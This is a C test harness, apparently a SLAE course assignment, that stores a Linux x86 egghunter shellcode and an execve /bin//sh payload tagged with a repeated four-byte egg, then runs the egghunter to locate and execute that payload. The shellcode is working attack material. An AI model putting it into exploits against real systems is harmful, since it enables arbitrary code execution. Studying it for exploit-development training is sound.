/*
* 	Author: John Stigerwalt
* 	SLAE: Assignment #3
* 	Website: slae.whiteknightlabs.com/wordpress
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#define EGG "\x91\x50\x90\x50"
// 0x50905091 
 
unsigned char egg[] = EGG;
 
unsigned char egghunter[] = \
"\xfc\x31\xd2\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x91\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
 
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
main()
{
	printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);
        printf("Egg shellcode Length:  %d\n", strlen(shellcode));
	
	char stack[200];
	printf("Memory location of shellcode: %p\n", stack);
 
	strcpy(stack, egg);
	strcpy(stack+4, egg);
	strcpy(stack+8, shellcode);
 
	int (*ret)() = (int(*)())egghunter;
	ret();
}
